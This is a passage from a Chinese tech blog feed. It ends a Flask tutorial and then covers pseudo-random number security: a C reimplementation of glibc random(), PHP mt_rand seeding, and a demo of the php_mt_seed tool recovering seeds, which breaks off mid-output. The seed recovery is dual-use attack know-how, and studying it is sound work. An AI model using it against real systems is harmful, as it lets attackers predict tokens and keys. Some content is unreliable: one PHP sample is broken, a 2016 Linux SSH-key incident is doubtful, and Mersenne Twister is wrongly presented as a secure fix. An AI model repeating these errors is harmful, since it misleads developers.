href="#1-6-与其他框架的对比" class="headerlink" title="1.6 与其他框架的对比"></a>1.6 与其他框架的对比</h2><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-04%2017.07.10.png" alt="Flask vs Django vs FastAPI" style="zoom:50%;"><p>Flask 是一个非常适合快速开发、轻量级 Web 应用的框架。如果你需要一个简单易用、灵活可扩展的 Python Web 框架，Flask 是一个很好的选择。</p><h1 id="二、Flask-的基本应用结构"><a href="#二、Flask-的基本应用结构" class="headerlink" title="二、Flask 的基本应用结构"></a>二、Flask 的基本应用结构</h1><p>一个简单的 Flask 应用示例如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token comment"># 创建 Flask 应用实例</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment"># 定义路由与视图函数</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/greet/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">greet</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token comment"># 启动应用</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三、Flask常用模块"><a href="#三、Flask常用模块" class="headerlink" title="三、Flask常用模块"></a>三、Flask常用模块</h1><h2 id="3-1-Flask"><a href="#3-1-Flask" class="headerlink" title="3.1 Flask"></a>3.1 Flask</h2><h3 id="3-1-1-Flask类的基本使用"><a href="#3-1-1-Flask类的基本使用" class="headerlink" title="3.1.1 Flask类的基本使用"></a>3.1.1 Flask类的基本使用</h3><p><strong>用途</strong>：核心模块，用于创建和管理 Flask 应用程序。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>app = Flask(__name__)</code> 是 Flask 应用的基础代码，它用于创建一个 Flask 应用实例。</p><h3 id="1-Flask-类"><a href="#1-Flask-类" class="headerlink" title="1. Flask 类"></a><strong>1. <code>Flask</code> 类</strong></h3><ul><li><code>Flask</code> 是 Flask 框架提供的核心类，负责处理 HTTP 请求、管理路由、加载配置等功能。</li><li>通过实例化 <code>Flask</code> 类，可以生成一个应用对象，用于组织和运行整个 Web 应用。</li></ul><h3 id="2-name-参数"><a href="#2-name-参数" class="headerlink" title="2. __name__ 参数"></a><strong>2. <code>__name__</code> 参数</strong></h3><ul><li><code>__name__</code>是 Python 的特殊变量，用于标识当前模块的名字。<ul><li>如果该模块是直接运行的脚本，<code>__name__</code> 的值为 <code>'__main__'</code>。</li><li>如果该模块是被导入的，<code>__name__</code> 的值为模块的名称。</li></ul></li><li>在 Flask 中，<code>__name__</code>的作用<ul><li><strong>确定应用的根路径</strong>：Flask 使用它定位应用所在的目录，这对加载静态文件（如 CSS、JS）和模板文件（如 HTML）至关重要。</li></ul></li></ul><h3 id="3-app-变量"><a href="#3-app-变量" class="headerlink" title="3. app 变量"></a><strong>3. <code>app</code> 变量</strong></h3><ul><li><p><code>app</code> 是通过 <code>Flask</code> 类实例化得到的对象，它代表了整个 Flask 应用实例。</p></li><li><p>它是 Web 应用的核心，用于注册路由、处理请求、配置应用、管理扩展等。</p></li><li><p>常见用法：</p><p><strong>定义路由</strong>：</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​       <strong>运行应用：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>总结：<code>app = Flask(__name__)</code> 是 Flask 应用开发的起点，用来初始化一个 Web 应用对象。<code>Flask</code> 类负责提供应用的功能，而 <code>__name__</code> 帮助框架定位资源路径和运行环境。</p></blockquote><h3 id="3-1-2-监听0-0-0-0和127-0-0-1的区别"><a href="#3-1-2-监听0-0-0-0和127-0-0-1的区别" class="headerlink" title="3.1.2 监听0.0.0.0和127.0.0.1的区别"></a>3.1.2 监听0.0.0.0和127.0.0.1的区别</h3><p>app.run(host=‘0.0.0.0’,port=5001) 和app.run(host=‘127.0.0.1’,port=5001) </p><blockquote><p><code>app.run(host='0.0.0.0', port=5001)</code> 和 <code>app.run(host='127.0.0.1', port=5001)</code> 都是启动 Flask 应用的方法，但它们在 <strong>监听地址</strong> 和 <strong>访问方式</strong> 上存在差异。以下是详细解释：</p><h3 id="1-共同点"><a href="#1-共同点" class="headerlink" title="1. 共同点"></a>1. <strong>共同点</strong></h3><ul><li><strong>功能</strong>：两者都用于启动 Flask 开发服务器，监听指定的主机地址和端口。</li><li><strong>端口号</strong>：两者都监听 <code>5001</code> 端口，可以通过浏览器或 HTTP 客户端访问。</li></ul><h3 id="2-差异：监听地址（host-参数）"><a href="#2-差异：监听地址（host-参数）" class="headerlink" title="2. 差异：监听地址（host 参数）"></a>2. <strong>差异：监听地址（<code>host</code> 参数）</strong></h3><h4 id="host-0-0-0-0"><a href="#host-0-0-0-0" class="headerlink" title="host='0.0.0.0'"></a><strong><code>host='0.0.0.0'</code></strong></h4><ul><li>含义：<ul><li><code>0.0.0.0</code> 是一个特殊的 IP 地址，表示<strong>监听所有网络接口</strong>（包括本地接口和外部接口）。</li></ul></li><li><strong>结果</strong>：<ul><li>应用可以被<strong>本机（localhost）和同一局域网中的其他设备</strong>访问。</li><li>示例：<ul><li>本地访问：<code>http://127.0.0.1:5001</code></li><li>局域网访问：<code>http://&lt;你的局域网 IP&gt;:5001</code>（如 <code>http://192.168.1.100:5001</code>）</li></ul></li></ul></li></ul><h4 id="host-127-0-0-1"><a href="#host-127-0-0-1" class="headerlink" title="host='127.0.0.1'"></a><strong><code>host='127.0.0.1'</code></strong></h4><ul><li>含义：<ul><li><code>127.0.0.1</code> 是本地回环地址（localhost），只监听本地接口。</li></ul></li><li>结果：<ul><li>应用<strong>只能被本机访问</strong>，无法被其他设备访问。</li><li>示例：<ul><li>本地访问：<code>http://127.0.0.1:5001</code></li><li>局域网设备无法访问。</li></ul></li></ul></li></ul><h3 id="3-实际用途"><a href="#3-实际用途" class="headerlink" title="3.实际用途"></a>3.<strong>实际用途</strong></h3><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-06%2010.41.55.png" alt="实际用途" style="zoom:50%;"><h3 id="4-安全性注意事项"><a href="#4-安全性注意事项" class="headerlink" title="4. 安全性注意事项"></a>4. <strong>安全性注意事项</strong></h3><ul><li>开发环境：<ul><li>Flask 自带的开发服务器不适合生产环境，<code>host='0.0.0.0'</code> 时需特别小心，避免暴露到公网。</li></ul></li><li>生产环境：<ul><li>使用专业的 WSGI 服务器（如 <strong>gunicorn</strong> 或 <strong>uWSGI</strong>）配合反向代理服务器（如 Nginx）运行应用，提供更高的性能和安全性。</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>**<code>host='127.0.0.1'</code>**：仅限本机访问，适合安全性要求较高的开发场景。</li><li>**<code>host='0.0.0.0'</code>**：允许外部设备访问，适合局域网测试或需要共享的场景，但需注意潜在的安全风险。</li></ul></blockquote><h2 id="3-2-jsonify"><a href="#3-2-jsonify" class="headerlink" title="3.2 jsonify"></a>3.2 jsonify</h2><p><strong>用途</strong>：将 Python 数据结构（如字典、列表等）转换为 JSON 格式并返回 HTTP 响应。</p><p><strong>特点</strong>：自动设置响应的 <code>Content-Type</code> 为 <code>application/json</code>。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonify<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-request"><a href="#3-3-request" class="headerlink" title="3.3 request"></a>3.3 request</h2><p><strong>用途</strong>：获取客户端发送的 HTTP 请求信息，包括数据、头部、方法等。</p><p><strong>常用方法</strong>：</p><ul><li><code>request.args</code>：获取查询参数（GET 请求）。</li><li><code>request.form</code>：获取表单数据（POST 请求）。</li><li><code>request.json</code>：获取 JSON 格式的数据。</li></ul><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/form'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-redirect"><a href="#3-4-redirect" class="headerlink" title="3.4 redirect"></a>3.4 redirect</h2><p><strong>用途</strong>：重定向到指定的 URL。</p><p><strong>特点</strong>：通常与 HTTP 状态码 302 或 301 一起使用。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/old'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">old</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/new'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-render-template"><a href="#3-5-render-template" class="headerlink" title="3.5 render_template"></a>3.5 <strong>render_template</strong></h2><ul><li><strong>用途</strong>：渲染模板文件（如 HTML），动态生成网页内容。</li><li><strong>特点</strong>：使用 Jinja2 模板引擎，支持变量替换和逻辑控制。</li><li><strong>示例</strong>：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前后端开发 </tag>
            
            <tag> python </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机数安全</title>
      <link href="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/"/>
      <url>/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="一、伪随机数"><a href="#一、伪随机数" class="headerlink" title="一、伪随机数"></a>一、伪随机数</h1><h2 id="1-1-伪随机数的概念"><a href="#1-1-伪随机数的概念" class="headerlink" title="1.1 伪随机数的概念"></a>1.1 伪随机数的概念</h2><p><strong>伪随机数</strong>（Pseudo-Random Number）是通过确定性算法生成的一系列数字，这些数字看似随机，但实际上是由一个初始值（种子，seed）通过特定的数学公式计算得到的。因此，伪随机数在本质上是<strong>可预测</strong>的，只要种子值和生成算法相同，输出的序列也将完全相同。</p><p>一般伪随机数分为两类：</p><ul><li>强伪随机数：难以预测的随机数</li><li>弱伪随机数：容易预测的随机数（一般是漏洞高发点）</li></ul><h2 id="1-2-伪随机数的特点"><a href="#1-2-伪随机数的特点" class="headerlink" title="1.2 伪随机数的特点"></a>1.2 伪随机数的特点</h2><ul><li><p>可重复性<br>伪随机数的生成依赖于种子值，使用相同的种子可以生成相同的随机序列，这使得它在调试和测试中非常有用。</p></li><li><p>近似随机性<br>虽然伪随机数是通过确定性算法生成的，但它们在统计特性上接近真正的随机数，满足均匀分布、独立性等随机性要求，适用于大多数应用场景。</p></li><li><p>效率高<br>伪随机数生成通常比真随机数更快，且不依赖外部物理设备，易于在软件中实现。</p></li></ul><h2 id="1-3-真随机数与伪随机数的区别"><a href="#1-3-真随机数与伪随机数的区别" class="headerlink" title="1.3 真随机数与伪随机数的区别"></a>1.3 真随机数与伪随机数的区别</h2><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.15.27.png" alt="真随机数与伪随机数的区别" style="zoom:50%;"><h1 id="二、伪随机数的安全问题"><a href="#二、伪随机数的安全问题" class="headerlink" title="二、伪随机数的安全问题"></a>二、伪随机数的安全问题</h1><p>确定的算法+随机数种子=&gt;可预测的随机数序列。</p><h2 id="2-1-可预测性问题"><a href="#2-1-可预测性问题" class="headerlink" title="2.1 可预测性问题"></a>2.1 可预测性问题</h2><h4 id="2-1-1-问题描述"><a href="#2-1-1-问题描述" class="headerlink" title="2.1.1 问题描述"></a>2.1.1 问题描述</h4><p>伪随机数生成器（PRNG）的输出依赖于<strong>种子值</strong>，一旦种子值被攻击者知道或猜测到，后续生成的所有伪随机数都可以被预测。这对<strong>密码学</strong>中的密钥生成、会话密钥等至关重要的数据是致命的。</p><h4 id="2-1-2-实例"><a href="#2-1-2-实例" class="headerlink" title="2.1.2 实例"></a>2.1.2 实例</h4><p><strong>Linux内核的随机数预测漏洞</strong>（2016年）：由于种子熵不足，攻击者通过推测种子值预测了伪随机数，导致SSH会话密钥被破解。</p><h4 id="2-1-3-解决方案"><a href="#2-1-3-解决方案" class="headerlink" title="2.1.3 解决方案"></a>2.1.3 解决方案</h4><p>使用<strong>加密安全伪随机数生成器（CSPRNG）</strong>。CSPRNG通过使用安全的哈希函数、对称加密等算法，使得即使种子部分暴露，也无法预测未来的输出。</p><p>增加<strong>种子的熵</strong>（Entropy），从不可预测的物理来源获取种子，例如鼠标移动、键盘输入、系统噪声等。</p><h2 id="2-2-周期性问题"><a href="#2-2-周期性问题" class="headerlink" title="2.2 周期性问题"></a>2.2 <strong>周期性问题</strong></h2><h3 id="2-2-1-问题描述"><a href="#2-2-1-问题描述" class="headerlink" title="2.2.1 问题描述"></a>2.2.1 问题描述</h3><p>伪随机数生成器具有有限的周期，周期一旦被攻击者识别，输出的伪随机数序列就会重复。这在<strong>长时间运行的系统</strong>中会导致随机性退化，从而影响安全性。</p><h3 id="2-2-2-实例"><a href="#2-2-2-实例" class="headerlink" title="2.2.2 实例"></a>2.2.2 实例</h3><p>某些使用线性同余法（LCG）的系统在长时间运行后，其伪随机数输出进入了一个短周期，导致系统输出模式被攻击者利用。</p><h3 id="2-2-3-解决方案"><a href="#2-2-3-解决方案" class="headerlink" title="2.2.3 解决方案"></a>2.2.3 解决方案</h3><p>选择周期极长的PRNG，例如<strong>梅森旋转算法（Mersenne Twister, MT19937）</strong>。</p><p>结合多个随机数生成器，或在周期耗尽前重新注入新的随机熵。</p><h1 id="三、伪随机数安全问题实例"><a href="#三、伪随机数安全问题实例" class="headerlink" title="三、伪随机数安全问题实例"></a>三、伪随机数安全问题实例</h1><h2 id="3-1-PHP伪随机数生成"><a href="#3-1-PHP伪随机数生成" class="headerlink" title="3.1 PHP伪随机数生成"></a>3.1 PHP伪随机数生成</h2><p>以PHP中的随机数作为示例，在PHP中，常用的两个随机数生成函数为rand()及mt_rand()。</p><p>rand()主要依赖glibc的random()，实现原理如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">16807LL</span> <span class="token operator">*</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码首先初始化数组 <code>r</code> 的第一个元素为 1，然后通过一个线性同余生成器算法填充数组的前 31 个元素。接着，它将前 31 个元素的部分数值复制到数组的第 31 到 33 个位置。然后，从第 34 个元素开始，数组的每个元素都是前 31 个元素和前 3 个元素的和。最后，从第 344 个元素开始，程序打印出数组中每个元素的高 31 位值。这里使用了类型转换 <code>(unsigned int)</code> 和右移操作 <code>&gt;&gt; 1</code> 来获取高 31 位。</p><p>从中发现，当随机数多于32位时，可以对后续的随机数进行预测。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在mt_rand函数中，可以根据mt_srand进行播种，如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当随机数种子已知时，生成的随机数序列一致：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.58.57.png" alt="两次运行的结果一致" style="zoom:50%;"><p>两次运行的结果一致。</p><h2 id="3-2-逆推伪随机数种子"><a href="#3-2-逆推伪随机数种子" class="headerlink" title="3.2 逆推伪随机数种子"></a>3.2 逆推伪随机数种子</h2><p>同样的种子能生成固定的随机数，那么也能根据随机数在某种程度上逆推种子，可以通过开源工具php_mt_seed可以实现：</p><p><a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a> 【地址】</p><ul><li>用法示例</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ php5 <span class="token parameter variable">-r</span> <span class="token string">'mt_srand(1234567890); echo mt_rand(), "\n";'</span><span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">time</span> ./php_mt_seed <span class="token number">1328851649</span>    Pattern: EXACT    Version: <span class="token number">3.0</span>.7 to <span class="token number">5.2</span>.0    Found <span class="token number">0</span>, trying 0xfc000000 - 0xffffffff, speed <span class="token number">16261.0</span> Mseeds/s     Version: <span class="token number">5.2</span>.1+    Found <span class="token number">0</span>, trying 0x1e000000 - 0x1fffffff, speed <span class="token number">91.8</span> Mseeds/s     seed <span class="token operator">=</span> 0x1fd65f9a <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">1</span>, trying 0x26000000 - 0x27ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x273a3517 <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token punctuation">)</span>    Found <span class="token number">2</span>, trying 0x48000000 - 0x49ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token 